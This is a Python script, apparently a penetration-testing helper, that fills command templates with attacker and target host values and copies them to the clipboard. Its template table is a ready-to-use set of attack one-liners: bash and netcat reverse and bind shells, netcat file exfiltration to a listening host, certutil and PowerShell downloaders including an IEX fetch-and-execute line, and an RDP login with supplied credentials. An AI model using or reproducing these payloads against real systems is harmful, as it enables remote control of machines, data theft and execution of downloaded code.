#!/usr/bin/env python3

from re import match
from subprocess import Popen, PIPE
import argparse
import os
import re

Commands = {
    "bash"       : "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1",
    "certutil"   : "certutil -urlcache -split -f http://$LHOST/$FILE",
    "http"       : "http://$LHOST/$FILE",
    "msfvenom"   : "msfvenom LHOST=$LHOST LPORT=$LPORT",
    "ncfile"    : "nc -w 3 $LHOST $LPORT < $FILE",
    "ncb"       : "mkfifo /tmp/f; nc -lvnp $LPORT < /tmp/f | /bin/bash >/tmp/f 2>&1; rm /tmp/",
    "ncr"       : "mkfifo /tmp/f; nc $LHOST $LPORT < /tmp/f | /bin/bash >/tmp/f 2>&1; rm /tmp/f",
    "psdl"      : "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://$LHOST:80/$FILE','$FILE')\"",
    "psex"      : "powershell \"IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:80/$FILE')\"",
    "pswget"    : "wget -OutFile $FILE http://$LHOST/$FILE",
    "wget"       : "wget http://$LHOST/$FILE",
    "xfreerdp"   : "xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:$RHOST /u:$USER /p:'$PASS'",
}

def replace(input, vars):
    output = input
    for key in vars.keys():
        output = output.replace(key, vars[key])
    return output

def main(args):

    output = ""

    vars = {
        '$LHOST' : os.environ.get('LHOST'),
        '$LPORT' : os.environ.get('LPORT'),
        '$RHOST' : os.environ.get('RHOST'),
        '$FILE'  : args.file,
        '$USER'  : args.user,
        '$PASS'  : args.password,
    }

    cmd = args.cmd
    if cmd == "":
        args.list = True
    if cmd == "a":
        args.all = True
    if args.all:
        print("\n#\n# ALL COMMANDS\n#\n")
        for key in Commands.keys():
            print(replace(Commands[key], vars))
        exit()
    if args.list:
        print("\n#\n# COMMAND LIST\n#\n")
        for key in Commands.keys():
            print(f'{key : <20} : {Commands[key]}')
        parser.print_help()
        exit()
    if cmd:
        if cmd in Commands:
            output = replace(Commands[cmd], vars)
            if args.eval:
                output = f"eval {output}"
            # print(output)
            p1 = Popen(['xclip', '-selection', 'clipboard', '-f'], stdin=PIPE)
            p1.communicate(input=(output.encode()))
        else:
            print("Command not found")
    else:
        parser.print_help()

if __name__ == "__main__":
    parser = argparse.ArgumentParser('Command player')
    parser.add_argument('-a', '--all', dest='all', action='store_true', help='Fill all templates and display')
    parser.add_argument('-e', '--eval', dest='eval', action='store_true', help='Wrap in eval. DANGER')
    parser.add_argument('-l', '--list', dest='list', action='store_true', help='List available templates')
    parser.add_argument('-f', '--file', default='', dest='file', action='store', type=str, help='File name')
    parser.add_argument('-u', '--user', default='', dest='user', action='store', type=str, help='Username')
    parser.add_argument('-p', '--password', default='', dest='password', action='store', type=str, help='Password')
    parser.add_argument('cmd', default='', nargs='?', type=str, help='Choose a command to play')
    args = parser.parse_args()
    main(args)
